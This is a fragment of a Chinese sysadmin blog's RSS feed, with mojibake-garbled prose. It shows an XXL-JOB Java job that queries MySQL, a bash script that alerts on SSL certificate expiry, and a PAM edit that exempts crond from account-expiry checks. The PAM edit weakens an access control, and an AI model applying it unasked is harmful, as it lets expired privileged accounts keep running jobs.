      <description>&lt;p&gt;æ•°æ®åº“ç®¡ç†å‘˜æœ‰ä¸ªç‰¹æ®Šçš„éœ€æ±‚ï¼š&lt;/p&gt;
&lt;p&gt;éœ€è¦ä¸€ä¸ªmsyqlå®¢æˆ·ç«¯ï¼Œå¯ä»¥å®šæ—¶å»è¿æ¥mysqlæœåŠ¡å™¨æ‰§è¡ŒSQLè¯­å¥ã€‚ä¸”å¯ä»¥è‡ªå·±åŠ¨æ€ç¼–è¾‘SQLè¯­å¥ã€‚&lt;/p&gt;
&lt;p&gt;æ‰¾æ¥æ‰¾å»ï¼Œæ•°æ®åº“ç®¡ç†å‘˜å¯¹spring javaè¿™ç±»ä¸œè¥¿å§ä¸€æ— æ‰€çŸ¥ï¼Œä½†æ˜¯é€šæ™“SQLï¼Œè¿™ç§æƒ…å½¢XXL-JOBçš„EXECUTORä»£ä½æ‰§è¡Œå°±æ¯”è¾ƒé€‚åˆã€‚&lt;/p&gt;
&lt;p&gt;ä¸»æ§åœ°å€ï¼šhttp://172.18.31.13/xxl-job-admin/&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://rendoumi.com/posts/20231212-xxl-job/2022-02-07_091252.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;ä½¿ç”¨å¾ˆç®€å•ï¼Œæˆ‘ä»¬åœ¨172.18.31.14è£…ä¸€ä¸ªè¢«æ§ç«¯çš„executorï¼Œè¿è¡Œæ¨¡å¼é€‰æ‹©GLUE(Java)æ¨¡å¼ï¼ŒGLUEæ¨¡å¼å°±å¯ä»¥éšä¾¿ç¼–è¾‘ JAVA+SQLæºä»£ç äº†ã€‚è®¾ç½®æ‰§è¡Œé¢‘ç‡æ˜¯æ¯30åˆ†é’Ÿæ‰§è¡Œä¸€æ¬¡ã€‚&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://rendoumi.com/posts/20231212-xxl-job/2022-02-07_091351.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;é€‰æ‹©GLUEæ¨¡å¼åï¼Œæˆ‘ä»¬å°±å¯ä»¥åœ¨GLUE IDEé‡Œç¼–è¾‘ä»£ç ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://rendoumi.com/posts/20231212-xxl-job/2022-02-07_091558.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;ä»£ç å¦‚ä¸‹ï¼š
æ³¨ï¼šåœ¨172.18.31.14ä¸Šé¢å·²ç»è£…äº†ä¸€ä¸ªMySQLæœåŠ¡ç«¯ï¼Œæœ‰ä¸€ä¸ªuseråº“ã€‚&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;package com.xxl.job.service.handler;

import com.xxl.job.core.context.XxlJobHelper;
import com.xxl.job.core.handler.IJobHandler;
import org.springframework.jdbc.core.JdbcTemplate;
import org.springframework.jdbc.datasource.DriverManagerDataSource;

public class DemoGlueJobHandler extends IJobHandler {

	@Override
	public void execute() throws Exception {

        DriverManagerDataSource ds = new DriverManagerDataSource();
        ds.setDriverClassName(&amp;#34;com.mysql.jdbc.Driver&amp;#34;);
        ds.setUrl(&amp;#34;jdbc:mysql://localhost:3306/users?characterEncoding=UTF-8&amp;amp;useSSL=false&amp;#34;);
        ds.setUsername(&amp;#34;root&amp;#34;);
        ds.setPassword(&amp;#34;xxxxxxxx&amp;#34;);

        JdbcTemplate jdbcTemplate = new JdbcTemplate();
        jdbcTemplate.setDataSource(ds);
      

        List rows = jdbcTemplate.queryForList(&amp;#34;select * from user&amp;#34;); 
        Iterator it = rows.iterator(); 
        while(it.hasNext()) { 
            Map userMap = (Map) it.next(); 
            XxlJobHelper.log(userMap.get(&amp;#34;id&amp;#34;) + &amp;#34;\t&amp;#34;); 
            XxlJobHelper.log(userMap.get(&amp;#34;name&amp;#34;) + &amp;#34;\t&amp;#34;); 
        } 
      
        XxlJobHelper.log(&amp;#34;XXL-JOB guning, Hello World.&amp;#34;);
	}

  
}
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;ä¸ºäº†å®ç°mysqlå®¢æˆ·ç«¯å¯ä»¥å¯¹MySQLè¿›è¡Œè¯»å†™ï¼Œæˆ‘ä»¬éœ€è¦åœ¨xxl-jobçš„xxl-job-executor-sample-springbootç¤ºä¾‹é¡¹ç›®ä¸­ï¼Œpom.xmlä¸­å¢åŠ spring-jdbcå’Œmysql-connector-javaçš„jaråŒ…éƒ¨åˆ†ã€‚æ‰“å‡ºä¸€ä¸ªxxl-jobçš„executorçš„æ‰§è¡Œç«¯ç¨‹åºã€‚&lt;/p&gt;</description>
    </item>
    <item>
      <title>æ£€æŸ¥è¯ä¹¦æ˜¯å¦è¿‡æœŸçš„è„šæœ¬</title>
      <link>https://rendoumi.com/posts/20231212-check_ssl/</link>
      <pubDate>Tue, 12 Dec 2023 09:05:11 +0800</pubDate>
      <guid>https://rendoumi.com/posts/20231212-check_ssl/</guid>
      <description>&lt;p&gt;è¯ä¹¦ä¼šç»å¸¸é¢ä¸´è¿‡æœŸè€Œæ²¡æœ‰åŠæ—¶ç»­è´¹çš„æƒ…å†µï¼Œå†™ä¸ªè„šæœ¬æé†’ä¸€ä¸‹è‡ªå·±å§ï¼š&lt;/p&gt;
&lt;p&gt;crontab -l&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;0 8 * * * /usr/local/bin/check_ssl.sh www.ddky.com
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;check_ssl.shçš„å†…å®¹ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cp&#34;&gt;#!/bin/bash
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cp&#34;&gt;&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;# Print the number of days till certificate expiration&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;#&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# Example:&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;#   $ check_cert.sh sleeplessbeastie.eu&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;#   81&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;#   $ check_cert.sh lwn.net&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;#   630&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;#&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# Exit codes:&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;#   0   - certificate is not expired&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;#   1   - certificate is     expired&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;#   254 - certificate is empty&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;#   255 - DNS resolution failed&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;#&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# temporary file to store certificate&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;certificate_file&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;$(&lt;/span&gt;mktemp&lt;span class=&#34;k&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# delete temporary file on exit&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;trap&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;unlink &lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$certificate_file&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt; EXIT
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$#&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt; -eq &lt;span class=&#34;s2&#34;&gt;&amp;#34;1&amp;#34;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;then&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;nv&#34;&gt;website&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$1&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  host &lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$website&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt; &amp;gt;&lt;span class=&#34;p&#34;&gt;&amp;amp;&lt;/span&gt;-
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$?&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt; -eq &lt;span class=&#34;s2&#34;&gt;&amp;#34;0&amp;#34;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;then&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nb&#34;&gt;echo&lt;/span&gt; -n &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; openssl s_client -servername &lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$website&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt; -connect &lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$website&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;:443 2&amp;gt;/dev/null &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; sed -ne &lt;span class=&#34;s1&#34;&gt;&amp;#39;/-BEGIN CERTIFICATE-/,/-END CERTIFICATE-/p&amp;#39;&lt;/span&gt; &amp;gt; &lt;span class=&#34;nv&#34;&gt;$certificate_file&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nv&#34;&gt;certificate_size&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;$(&lt;/span&gt;stat -c &lt;span class=&#34;s2&#34;&gt;&amp;#34;%s&amp;#34;&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$certificate_file&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$certificate_size&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt; -gt &lt;span class=&#34;s2&#34;&gt;&amp;#34;1&amp;#34;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;then&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      &lt;span class=&#34;nv&#34;&gt;date&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;$(&lt;/span&gt;openssl x509 -in &lt;span class=&#34;nv&#34;&gt;$certificate_file&lt;/span&gt; -enddate -noout &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; sed &lt;span class=&#34;s2&#34;&gt;&amp;#34;s/.*=\(.*\)/\1/&amp;#34;&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      &lt;span class=&#34;nv&#34;&gt;date_s&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;$(&lt;/span&gt;date -d &lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;${&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;date&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt; +%s&lt;span class=&#34;k&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      &lt;span class=&#34;nv&#34;&gt;now_s&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;$(&lt;/span&gt;date -d now +%s&lt;span class=&#34;k&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      &lt;span class=&#34;nv&#34;&gt;date_diff&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;$((&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;date_s &lt;span class=&#34;o&#34;&gt;-&lt;/span&gt; now_s&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;/&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;86400&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;))&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      &lt;span class=&#34;nb&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$date_diff&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$date_diff&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt; -le &lt;span class=&#34;m&#34;&gt;37&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;then&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;          /usr/local/bin/mailsend -q -to &lt;span class=&#34;s2&#34;&gt;&amp;#34;zhangranrui@ddky.com&amp;#34;&lt;/span&gt; -from monit@ddky.com -ssl -port &lt;span class=&#34;m&#34;&gt;465&lt;/span&gt; -auth -auth-plan -smtp smtp.exmail.qq.com -sub &lt;span class=&#34;s2&#34;&gt;&amp;#34;è¯ä¹¦å°±è¦åˆ°æœŸäº†&amp;#34;&lt;/span&gt; -v -user &lt;span class=&#34;s2&#34;&gt;&amp;#34;monit@ddky.com&amp;#34;&lt;/span&gt; -pass &lt;span class=&#34;s2&#34;&gt;&amp;#34;xxxxxxxx&amp;#34;&lt;/span&gt; -cs &lt;span class=&#34;s2&#34;&gt;&amp;#34;utf-8&amp;#34;&lt;/span&gt; -enc-type &lt;span class=&#34;s2&#34;&gt;&amp;#34;base64&amp;#34;&lt;/span&gt; -M &lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$website&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt; è¿˜æœ‰ &lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$date_diff&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt; å¤©å°±è¦åˆ°æœŸäº†ï¼ï¼ï¼&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      &lt;span class=&#34;k&#34;&gt;fi&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$date_s&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt; -gt &lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$now_s&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;then&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;nb&#34;&gt;exit&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;# ok&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      &lt;span class=&#34;k&#34;&gt;else&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;nb&#34;&gt;exit&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;# not ok&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      &lt;span class=&#34;k&#34;&gt;fi&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;else&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      &lt;span class=&#34;nb&#34;&gt;exit&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;254&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;fi&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;k&#34;&gt;else&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nb&#34;&gt;exit&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;255&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;k&#34;&gt;fi&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;fi&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
    </item>
    <item>
      <title>rootçš„crontabç”±äºrootå¯†ç å¤±æ•ˆå¯¼è‡´ä¸èƒ½æ­£å¸¸å·¥ä½œ</title>
      <link>https://rendoumi.com/posts/20231211-crontab_root/</link>
      <pubDate>Mon, 11 Dec 2023 11:05:11 +0800</pubDate>
      <guid>https://rendoumi.com/posts/20231211-crontab_root/</guid>
      <description>&lt;p&gt;æ•°æ®åº“ç®¡ç†å‘˜çš„ 172.18.20.10 å’Œ 172.18.20.25 æ•°æ®åº“å¤‡ä»½è„šæœ¬æ˜¯ä»¥ root èº«ä»½è¿è¡Œçš„ï¼Œåœ¨ crontab é‡Œè·‘ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;m&#34;&gt;26&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;11&lt;/span&gt; * * * /root/scripts/mysql_backup_full_3306.sh &amp;gt; /dev/null 2&amp;gt;&lt;span class=&#34;p&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;1&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;ä½†æ˜¯ç”±äº root å¯†ç ä¼šæ¯ä¸‰ä¸ªæœˆå˜æ›´ä¸€æ¬¡ï¼Œå¦‚æœæ²¡æœ‰åŠæ—¶å˜æ›´ï¼Œä¼šå¯¼è‡´ root å¯†ç å¤±æ•ˆï¼Œä»è€Œ crontab æ— æ³•æ­£å¸¸è¿è¡Œã€‚&lt;/p&gt;
&lt;p&gt;è§£å†³æ–¹æ³•å¾ˆç®€å•ï¼š
æ‰¾åˆ° /etc/pam.d/password-auth , å…¶ä¸­ account çš„æœ‰å››è¡Œ&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;account     required      pam_unix.so
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;account     sufficient    pam_localuser.so
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;account     sufficient    pam_succeed_if.so uid &amp;lt; &lt;span class=&#34;m&#34;&gt;1000&lt;/span&gt; quiet
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;account     required      pam_permit.so
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;åœ¨å‰é¢å¢åŠ ä¸¤è¡Œï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;account     required      pam_access.so
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;account     &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;success&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;default&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;ignore&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; pam_succeed_if.so service in crond quiet use_uid
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;account     required      pam_unix.so
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;account     sufficient    pam_localuser.so
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;account     sufficient    pam_succeed_if.so uid &amp;lt; &lt;span class=&#34;m&#34;&gt;1000&lt;/span&gt; quiet
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;account     required      pam_permit.so
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;è¿™æ ·å°±å¯ä»¥äº†ï¼Œä¸ç”¨é‡å¯ä»»ä½•æœåŠ¡ã€‚&lt;/p&gt;</description>
    </item>
    <item>
      <title>Rsyslogçš„ä¸€äº›ç‰¹æ®Šç”¨æ³•</title>
      <link>https://rendoumi.com/posts/20231211-rsyslog_usage/</link>
      <pubDate>Mon, 11 Dec 2023 10:05:11 +0800</pubDate>
      <guid>https://rendoumi.com/posts/20231211-rsyslog_usage/</guid>
      <description>&lt;p&gt;Rsyslogçš„æ¨¡æ¿æ–‡ä»¶æŒ‰æ—¥æœŸå­˜æ”¾ï¼š&lt;/p&gt;
